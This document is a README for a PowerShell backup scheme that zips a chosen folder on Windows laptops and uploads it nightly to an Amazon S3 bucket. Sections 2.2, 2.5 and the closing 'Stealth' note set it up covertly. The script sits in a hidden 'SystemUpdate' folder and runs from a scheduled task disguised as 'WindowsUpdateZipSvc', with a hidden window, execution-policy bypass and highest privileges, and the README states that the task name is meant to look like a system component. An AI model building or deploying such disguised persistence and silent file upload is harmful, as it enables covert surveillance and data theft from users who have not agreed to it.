# Maksiti Backups — README

## 1) AWS (once)
- Create IAM user: **`backup-user`** (programmatic access only).
- Attach policy granting access **only** to bucket **`arbrim-backups-test`** (ListBucket, Put/Get/DeleteObject).
- Save the access key CSV.

> (Optional) As an admin, add an S3 **Lifecycle rule** to expire `zips/` after 7 days (CLI step below).

---

## 2) Windows setup (per laptop)

### 2.1 Install & configure AWS CLI
Download and install:  
`https://awscli.amazonaws.com/AWSCLIV2.msi`

Verify:
```powershell
aws --version
```

Configure:
```powershell
aws configure
```
Use:
```
Access Key ID: <from backup-user CSV>
Secret Access Key: <from backup-user CSV>
Default region: eu-central-1
Output format: json
```

### 2.2 Create hidden script folder (user-writable; no admin needed)
```powershell
New-Item -ItemType Directory -Path "C:\Users\<USER>\AppData\Local\SystemUpdate" -Force | Out-Null
attrib +h "C:\Users\<USER>\AppData\Local\SystemUpdate"
```

### 2.3 Pick backup source and S3 layout
```
Local folder to back up (edit per machine):
C:\Users\<USER>\Desktop\maksitest

S3 bucket:
arbrim-backups-test

Zips stored under (auto by script):
s3://arbrim-backups-test/zips/<COMPUTER>/
```

### 2.4 Save the PowerShell script
Path:
```
C:\Users\<USER>\AppData\Local\SystemUpdate\WinZipBackup.ps1
```

Content:
```powershell
# --- EDIT THESE TWO PER MACHINE ---
$SrcPath = "C:\Users\<USER>\Desktop\maksitest"   # Folder to back up
$Bucket  = "arbrim-backups-test"                     # S3 bucket
# ----------------------------------

$Computer  = $env:COMPUTERNAME
$UserName  = $env:USERNAME
$Stamp     = (Get-Date).ToString("yyyy-MM-dd_HH-mm")
$Prefix    = "zips/$Computer"
$ZipName   = "${Computer}-${UserName}_${Stamp}.zip"
$TempZip   = Join-Path $env:TEMP $ZipName

if (-not (Test-Path $SrcPath)) { exit 0 }

try {
    if (Test-Path $TempZip) { Remove-Item $TempZip -Force -ErrorAction SilentlyContinue }
    Compress-Archive -Path $SrcPath -DestinationPath $TempZip -CompressionLevel Optimal -Force
} catch { exit 0 }

$S3Key = "$Prefix/$ZipName"
$null = aws s3 cp "$TempZip" "s3://$Bucket/$S3Key" --sse AES256 2>$null
Remove-Item $TempZip -Force -ErrorAction SilentlyContinue

# Optional local retention (skip if using S3 lifecycle):
try {
    $cutoff = (Get-Date).AddDays(-7)
    $list = aws s3api list-objects-v2 --bucket $Bucket --prefix $Prefix/ | ConvertFrom-Json
    foreach ($obj in ($list.Contents | Where-Object { $_.LastModified -lt $cutoff })) {
        $null = aws s3api delete-object --bucket $Bucket --key $obj.Key 2>$null
    }
} catch { }
```

### 2.5 Schedule it (silent nightly run)
```powershell
schtasks /Create /TN "WindowsUpdateZipSvc" /TR "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\arbri\AppData\Local\SystemUpdate\WinZipBackup.ps1" /SC DAILY /ST 03:00 /RL HIGHEST /F
```

Then in Task Scheduler → Properties → **Run whether user is logged on or not** (enter your Windows password once).  
To test now: right-click the task → **Run**.

---

## 3) S3 lifecycle (keep 7 days) — optional but recommended

Save JSON:
```
C:\Users\<USER>\AppData\Local\SystemUpdate\lifecycle.json
```
```json
{
  "Rules": [
    {
      "ID": "ExpireZipBackupsAfter7Days",
      "Status": "Enabled",
      "Filter": { "Prefix": "zips/" },
      "Expiration": { "Days": 7 }
    }
  ]
}
```

Apply (run as an admin/owner who has lifecycle permissions):
```powershell
aws s3api put-bucket-lifecycle-configuration `
  --bucket arbrim-backups-test `
  --lifecycle-configuration file://C:\Users\<USER>\AppData\Local\SystemUpdate\lifecycle.json `
  --region eu-central-1
```

Verify:
```powershell
aws s3api get-bucket-lifecycle-configuration --bucket arbrim-backups-test --region eu-central-1
```

---

## 4) Restore & notes

**Restore:** download the desired zip from  
`s3://arbrim-backups-test/zips/<COMPUTER>/<COMPUTER>-<USER>_YYYY-MM-DD_HH-mm.zip`  
and unzip.

**Scale to more laptops:** copy `WinZipBackup.ps1`, edit only `$SrcPath`, run the same `schtasks` command (path includes the user’s profile). Lifecycle rule applies to all machines automatically.

**Stealth:** script runs with hidden PowerShell; folder is hidden; task name looks system-ish.

Verify task is configured daily
```
schtasks /Query /TN "WindowsUpdateZipSvc" /V /FO LIST
```
